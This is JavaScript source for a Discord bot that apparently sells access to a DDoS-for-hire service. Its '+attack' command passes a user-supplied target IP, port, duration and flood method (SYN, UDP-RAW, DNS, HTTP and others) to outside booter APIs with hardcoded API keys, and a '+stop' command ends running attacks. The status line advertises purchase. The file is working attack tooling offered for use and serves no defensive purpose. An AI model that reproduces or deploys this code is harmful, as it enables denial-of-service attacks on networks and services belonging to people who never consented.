const discord = require("discord.js");
const ms = require("ms");
const ping = require("ping");
var axios = require("axios");
const config = require("./config.json");
const client = new discord.Client();
function Warn(msg) {
  var embed = new discord.RichEmbed().setTitle(msg).setColor("#CF9B10");
  return embed;
}
function isLetter(c) {
  return c.toLowerCase() != c.toUpperCase();
}
client.on("message", msg => {
  if (msg.content === "+help" && msg.channel.id === "768162377354575924") {
    const embed = new discord.RichEmbed()
      .setTitle("Help Menu")
      .setDescription(
        "\r\n\r\n" +
          config.prefix +
          "attack (ip) (port) (time) (method)\r\n" +
          config.prefix +
          "methods (type +methods for methods)\r\n" 
      )
      .addField(
        "This bot is fully powered by Nulled",
        "Do not take our credit for our power! "
      )
      .setColor("#CF9B10")
      .setFooter("Powered By Nulled™");
    msg.channel.send(embed);
  }
});
client.on("message", msg => {
  if (msg.content === "+methods" && msg.channel.id === "768216849888182335") {
    const embed = new discord.RichEmbed()
      .setTitle("Methods")
      .setDescription("check announcements im lazy")
    msg.channel.send(embed);
  }
});
client.on("message", msg => {
  if (
    msg.content.startsWith(config.prefix + "stop") &&
    msg.channel.id === "767268636644868109"
  ) {
    const args = msg.content
      .slice(config.prefix.length)
      .trim()
      .split(/ +/g);
    if (args.length < 1) {
      msg.channel.send(Warn("Invalid args!"));
      return;
    }
    axios
      .get(
        "https://xmlapi.xyz/api.php?page=Api&key=termedmythic1&host=" + args[1] + "&port=" + args[2] + "&time=" + args[3] + "&method=STOP"
      )
      .then(response => {
        switch (response.data) {
          case "Started":
            msg.channel.send(Warn("Attack stopped on " + args[1] + "!"));
            break;
          case "NotRunning":
            msg.channel.send(
              Warn("doesnt have any attacks on " + args[1] + "!")
            );
            break;
          default:
            msg.channel.send(Warn("Bot could not connect to api..."));
            break;
        }
      });
  }
});

client.on("message", msg => {
  if (
    msg.content.startsWith("+attack") &&
    msg.channel.id === "768216849888182335"
  ) {
    const args = msg.content
      .slice(config.prefix.length)
      .trim()
      .split(/ +/g);
    if (args.length < 4) {
      msg.channel.send(Warn("usage: +attack <host> <port> <time> <method>"));
      return;
    }
    if (args[1].length > 15) {
      msg.channel.send(Warn("Invalid host lenght!"));
      return;
    }
    if (args[1].length < 7) {
      msg.channel.send(Warn("Invalid host lenght!"));
      return;
    }
    if (isLetter(args[1])) {
      msg.channel.send(Warn("Host cannot contain characters!"));
      return;
    }
    if (isLetter(args[2])) {
      msg.channel.send(Warn("Port cannot contain characters!"));
      return;
    }
    if (isLetter(args[3])) {
      msg.channel.send(Warn("Time cannot contain characters!"));
      return;
    }
    if (Number(args[2]) > 65535) {
      msg.channel.send(Warn("Max port size is 65535!"));
      return;
    }
    if (Number(args[3]) > config.maxtime) {
      msg.channel.send(Warn("Max time is " + config.maxtime + " seconds!"));
      return;
    }
    if (Number(args[3]) < config.mintime) {
      msg.channel.send(Warn("Min time is " + config.mintime + " seconds!"));
      return;
    }
    switch (
      args[4]
      // case "HTTP-PPS": break; case "HTTP-GHP": break; case "ICMP": break; case "XMAS": break; case "SYN": break; case "ACK": break; case "UDP-RAW": break;
      //case "UDP": break; case "STD": break; case "DNS": break;  case "ADV": break;
      //default: msg.channel.send(Warn('Invalid attack method!')); break;
    ) {
             //https://api.freeboot.to/api/api.php?host=host&port=port&time=time&method=method&key=821140458e4fc4d&username=billybob30757
    }
    axios.get("http://atomdata.services/1800.php?&key=DRQNLKGN645644KJKLJLJKLJklJLJ&host=" + args[1] + "&port=" + args[2] + "&time=" + args[3] + "&method=" + args[4] 
    )
      .then(response => {
        switch (response.data) {
          case "success":
            msg.channel.send(
              Warn(
                "Attack started on " + args[1] + " for " + args[3] + " seconds!"
              )
            );
            break;
          case "Running":
            msg.channel.send(
              Warn("Already have an attack running on " + args[1] + " !")
            );
            break;
          case "error":
            msg.channel.send(Warn(args[1] + " is blacklisted!"));
            break;
          //attack started moved:
          default:
            msg.channel.send(
              Warn(
                "Attack started on " +
                  args[1] +
                  " for " +
                  args[3] +
                  " seconds with " +
                  args[4] +
                  " !"
              )
            );
            break;
        }
      });
  }
});


client.on("message", msg => {
  if (
    msg.content.startsWith("+ping") &&
    msg.channel.id === "768162396932931605"
  ) {
    const args = msg.content
      .slice(config.prefix.length)
      .trim()
      .split(/ +/g);
    if (args[0].length < 4) {
      msg.channel.send(Warn("Usage: +ping <host>"));
      return;
    }
    if (args[1].length < 7) {
      msg.channel.send(Warn("Invalid host lenght!"));
      return;
    }
    if (args[1].length > 15) {
      msg.channel.send(Warn("Invalid host lenght!"));
      return;
    }
    msg.channel.send("Please wait while I Ping " + args[1]);
    var hosts = [args[1]];
    var i = 0;
    function myLoopspam() {
      setTimeout(function() {
        hosts.forEach(function(host) {
          ping.sys.probe(host, function(isAlive) {
            var whois = isAlive
              ? `Ping From ${msg.author.username} HOST ` +
                host +
                ` Is Online :white_check_mark:`
              : `Ping From ${msg.author.username} HOST ` +
                host +
                ` Is Offline:x:`;
            msg.channel.send(whois);
          });
        });
        i++;
        if (i < 10) {
          myLoopspam();
        }
      }, 2000);
    }
    myLoopspam();
  }
});

client.on("ready", () => {
  console.log("Connected!");
  client.user.setActivity(
    config.prefix +
      "help (DM Drqgs To Buy)"
  );
});

client.login(config.token);
